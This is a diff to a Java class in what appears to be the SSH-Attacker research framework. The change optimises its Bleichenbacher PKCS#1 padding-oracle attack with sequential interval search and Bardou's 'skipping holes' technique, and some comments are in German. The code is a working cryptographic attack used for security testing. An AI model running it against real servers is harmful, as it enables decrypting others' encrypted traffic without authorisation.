@@ -7,6 +7,8 @@
  */
 package de.rub.nds.sshattacker.attacks.pkcs1;
 
+import static de.rub.nds.sshattacker.attacks.pkcs1.util.MathHelper.ceil;
+
 import de.rub.nds.modifiablevariable.util.ArrayConverter;
 import de.rub.nds.sshattacker.attacks.pkcs1.oracles.Pkcs1Oracle;
 import de.rub.nds.sshattacker.attacks.pkcs1.util.MathHelper;
@@ -46,8 +48,8 @@ public class Bleichenbacher extends Pkcs1Attack {
 
     private boolean innerTrimmed = false;
     private boolean outerTrimmed = false;
-    private int innerTrimmers = 5000;
-    private int outerTrimmers = 1000;
+    private int innerTrimmers = 1500;
+    private int outerTrimmers = 500;
 
     /**
      * @param msg The message that should be decrypted with the attack
@@ -141,6 +143,28 @@ public class Bleichenbacher extends Pkcs1Attack {
         }
     }
 
+    private ArrayList<BigInteger[]> genState(
+            List<Interval> M, BigInteger previousS, CustomRsaPublicKey rsaPublicKey) {
+
+        // Arrayliste aus einem array Bigintegers
+
+        ArrayList<BigInteger[]> state = new ArrayList<>();
+
+        // für jedes M
+        for (Interval interval : M) {
+            BigInteger upperBound = interval.getUpper();
+            BigInteger bTimesPrevS = upperBound.multiply(previousS);
+            BigInteger bTimePrevsSubTwoB = bTimesPrevS.subtract(two_B);
+            BigInteger ri = ceil(big_two.multiply(bTimePrevsSubTwoB), rsaPublicKey.getModulus());
+
+            BigInteger rITimesN = ri.multiply(rsaPublicKey.getModulus());
+            BigInteger si_lower = ceil(two_B.add(rITimesN), upperBound);
+            state.add(new BigInteger[] {si_lower, ri});
+        }
+
+        return state;
+    }
+
     private BigInteger step2b(
             List<Interval> M,
             BigInteger previousS,
@@ -148,44 +172,71 @@ public class Bleichenbacher extends Pkcs1Attack {
             CustomRsaPublicKey rsaPublicKey,
             CustomRsaPublicKey outerKey) {
         LOGGER.info("RUNNING Step 2b");
-        BigInteger nextS;
-        ExecutorService executor = Executors.newFixedThreadPool(M.size());
 
-        List<Callable<BigInteger>> runners = new ArrayList<>();
+        LOGGER.info("the array has {} items", M.size());
 
-        for (Interval chosenInterval : M) {
-            Step2cRunner step2cRunner =
-                    new Step2cRunner(
-                            ciphertext,
-                            oracle,
-                            two_B,
-                            three_B,
-                            chosenInterval.lower,
-                            chosenInterval.upper,
-                            previousS,
-                            rsaPublicKey,
-                            outerKey);
-            runners.add(step2cRunner);
-        }
+        ArrayList<BigInteger[]> states = new ArrayList<>();
+        states = genState(M, previousS, rsaPublicKey);
 
-        List<Future<BigInteger>> results;
-        try {
-            results = executor.invokeAll(runners);
-        } catch (InterruptedException e) {
-            throw new RuntimeException(e);
-        }
         while (true) {
-            for (Future<BigInteger> result : results) {
-                if (result.isDone()) {
-                    try {
-                        nextS = result.get();
-                    } catch (InterruptedException | ExecutionException e) {
-                        throw new RuntimeException(e);
-                    }
-                    executor.shutdownNow();
-                    return nextS;
+            // für jedes M nach index
+            for (int i = 0; i < M.size(); i++) {
+                LOGGER.info("running in {}", i);
+                BigInteger a = M.get(i).lower;
+                BigInteger b = M.get(i).upper;
+                BigInteger currentS = states.get(i)[0];
+                BigInteger r = states.get(i)[1];
+                BigInteger[] results =
+                        step2cSingle(a, b, currentS, r, ciphertext, rsaPublicKey, outerKey);
+
+                BigInteger success = results[0];
+                currentS = results[1];
+                r = results[2];
+
+                if (success.compareTo(BigInteger.ONE) == 0) {
+                    return currentS;
+                } else {
+                    states.get(i)[0] = currentS;
+                    states.get(i)[1] = r;
                 }
             }
+        }
+    }
+
+    /**
+     * Implements "Skipping Holes" from Bardou, tests if s may be valid, returns if true or skips to
+     * the next valid s if false
+     *
+     * @param s The value to be checked.
+     * @param j Incrementor for the Holes
+     * @param low The lower bound of the range.
+     * @param high The upper bound of the range.
+     * @return The updated value of 's' to be used in the next iteration.
+     */
+    private BigInteger[] checkAndSkipS(
+            BigInteger s,
+            BigInteger j,
+            BigInteger low,
+            BigInteger high,
+            CustomRsaPublicKey publicKey,
+            Interval M) {
+        while (true) {
+            if (s.compareTo(low) >= 0 && s.compareTo(high) <= 0) {
+                s = high.add(BigInteger.ONE);
+            } else if (low.compareTo(high) > 0) {
+                return new BigInteger[] {s, BigInteger.ZERO, BigInteger.ZERO, BigInteger.ZERO};
+            } else if (s.compareTo(low) < 0) {
+                return new BigInteger[] {s, j, high, low};
+            }
+            j = j.add(BigInteger.ONE);
+            low = ceil(three_B.add(j.multiply(publicKey.getModulus())), M.lower); // ceil(3*B+j*n,a)
+            high =
+                    ceil(
+                                    two_B.add(
+                                            (j.add(BigInteger.ONE)
+                                                    .multiply(publicKey.getModulus()))),
+                                    M.upper)
+                            .subtract(BigInteger.ONE); // ceil(2*B+(j+1)*n,b)-1
         }
     }
 
@@ -193,12 +244,35 @@ public class Bleichenbacher extends Pkcs1Attack {
             BigInteger lowerBound,
             byte[] ciphertext,
             CustomRsaPublicKey rsaPublicKey,
-            CustomRsaPublicKey outerKey) {
+            CustomRsaPublicKey outerKey,
+            List<Interval> M) {
 
         BigInteger s = lowerBound;
         boolean oracleResult;
 
+        BigInteger j = BigInteger.ONE;
+        BigInteger low =
+                ceil(
+                        three_B.add(j.multiply(rsaPublicKey.getModulus())),
+                        M.get(0).lower); // ceil(3*B+j*n,a)
+        BigInteger high =
+                ceil(
+                                two_B.add(
+                                        (j.add(BigInteger.ONE)
+                                                .multiply(rsaPublicKey.getModulus()))),
+                                M.get(0).upper)
+                        .subtract(BigInteger.ONE); // ceil(2*B+(j+1)*n,b)-1
+
         while (true) {
+
+            if (j.compareTo(BigInteger.ZERO) > 0) {
+                BigInteger[] result = checkAndSkipS(s, j, low, high, rsaPublicKey, M.get(0));
+                s = result[0];
+                j = result[1];
+                high = result[2];
+                low = result[3];
+            }
+
             BigInteger attempt =
                     manipulateCiphertext(
                             s,
@@ -235,6 +309,60 @@ public class Bleichenbacher extends Pkcs1Attack {
         }
     }
 
+    private BigInteger[] step2cSingle(
+            BigInteger lowerBound,
+            BigInteger upperBound,
+            BigInteger currentS,
+            BigInteger r,
+            byte[] ciphertext,
+            CustomRsaPublicKey rsaPublicKey,
+            CustomRsaPublicKey outerKey) {
+
+        boolean oracleResult;
+
+        BigInteger rITimesN = r.multiply(rsaPublicKey.getModulus());
+        BigInteger si_upper = ceil(three_B.add(rITimesN), lowerBound);
+
+        LOGGER.info("Startin");
+
+        while (currentS.compareTo(si_upper) > 0) {
+            r = r.add(BigInteger.ONE);
+            rITimesN = r.multiply(rsaPublicKey.getModulus());
+            currentS = ceil(two_B.add(rITimesN), upperBound);
+            si_upper = ceil(three_B.add(rITimesN), lowerBound);
+        }
+
+        LOGGER.info("having good s");
+
+        BigInteger attempt =
+                manipulateCiphertext(
+                        currentS,
+                        rsaPublicKey.getPublicExponent(),
+                        rsaPublicKey.getModulus(),
+                        ciphertext);
+
+        LOGGER.info("Manipulated Successfull");
+
+        if (outerKey != null) {
+            BigInteger encryptedAttempt = encryptBigInt(attempt, outerKey);
+            oracleResult = queryOracle(encryptedAttempt, true);
+            counterInnerBleichenbacher++;
+        } else {
+            oracleResult = queryOracle(attempt, false);
+            counterOuterBleichenbacher++;
+        }
+
+        LOGGER.info("Querried Oracle");
+
+        if (oracleResult) {
+            LOGGER.debug("Successfull");
+            return new BigInteger[] {BigInteger.ONE, currentS, r};
+        } else {
+            LOGGER.debug("Failed");
+            return new BigInteger[] {BigInteger.ZERO, currentS.add(BigInteger.ONE), r};
+        }
+    }
+
     /**
      * Searches for a valid s-value in a given range of possible s-values for the inner encryption
      * of a nested (double encrypted) BB-Attack
@@ -259,16 +387,15 @@ public class Bleichenbacher extends Pkcs1Attack {
         //  ri = ceil(2 * (b * prev_s - 2 * B), n)
         BigInteger bTimesPrevs = upperBound.multiply(previousS);
         BigInteger bTimePrevsSubTwoB = bTimesPrevs.subtract(two_B);
-        BigInteger ri =
-                MathHelper.ceil(big_two.multiply(bTimePrevsSubTwoB), rsaPublicKey.getModulus());
+        BigInteger ri = ceil(big_two.multiply(bTimePrevsSubTwoB), rsaPublicKey.getModulus());
 
         while (true) {
 
             // si_lower = ceil(2 * B + ri * n, b)
             // si_upper = ceil(3 * B + ri * n, a)
             BigInteger rITimesN = ri.multiply(rsaPublicKey.getModulus());
-            BigInteger si_lower = MathHelper.ceil(two_B.add(rITimesN), upperBound);
-            BigInteger si_upper = MathHelper.ceil(three_B.add(rITimesN), lowerBound);
+            BigInteger si_lower = ceil(two_B.add(rITimesN), upperBound);
+            BigInteger si_upper = ceil(three_B.add(rITimesN), lowerBound);
 
             for (BigInteger si = si_lower;
                     si.compareTo(si_upper) < 0;
@@ -341,21 +468,21 @@ public class Bleichenbacher extends Pkcs1Attack {
             BigInteger lowerTimesS = chosenInterval.lower.multiply(s);
             BigInteger lowerPartForCeil = lowerTimesS.subtract(three_B_plus_one);
 
-            BigInteger r_lower = MathHelper.ceil(lowerPartForCeil, rsaPublicKey.getModulus());
+            BigInteger r_lower = ceil(lowerPartForCeil, rsaPublicKey.getModulus());
 
             /*
                 b * s - 2 * B
             */
             BigInteger upperTimesS = chosenInterval.upper.multiply(s);
             BigInteger upperPartForCeil = upperTimesS.subtract(two_B);
-            BigInteger r_upper = MathHelper.ceil(upperPartForCeil, rsaPublicKey.getModulus());
+            BigInteger r_upper = ceil(upperPartForCeil, rsaPublicKey.getModulus());
 
             for (BigInteger r = r_lower; r.compareTo(r_upper) < 0; r = r.add(BigInteger.ONE)) {
                 BigInteger lowerBound = chosenInterval.lower;
                 BigInteger upperBound = chosenInterval.upper;
 
                 BigInteger lowerUpperBound =
-                        MathHelper.ceil(two_B.add(r.multiply(rsaPublicKey.getModulus())), s);
+                        ceil(two_B.add(r.multiply(rsaPublicKey.getModulus())), s);
                 lowerBound = lowerBound.max(lowerUpperBound);
 
                 BigInteger upperUpperBound =
@@ -565,10 +692,11 @@ public class Bleichenbacher extends Pkcs1Attack {
 
         s =
                 step2a(
-                        MathHelper.ceil(innerPublicKey.getModulus().add(two_B), M.get(0).upper),
+                        ceil(innerPublicKey.getModulus().add(two_B), M.get(0).upper),
                         ciphertext,
                         innerPublicKey,
-                        outerPublicKey);
+                        outerPublicKey,
+                        M);
 
         LOGGER.debug(
                 "found s, initial updating M lower: {} M upper: {}",
@@ -580,7 +708,7 @@ public class Bleichenbacher extends Pkcs1Attack {
 
         while (true) {
             if (M.size() >= 2) {
-                s = step2b(s.add(BigInteger.ONE), ciphertext, innerPublicKey, outerPublicKey);
+                s = step2b(M, s.add(BigInteger.ONE), ciphertext, innerPublicKey, outerPublicKey);
             } else if (M.size() == 1) {
                 BigInteger a = M.get(0).lower;
                 BigInteger b = M.get(0).upper;
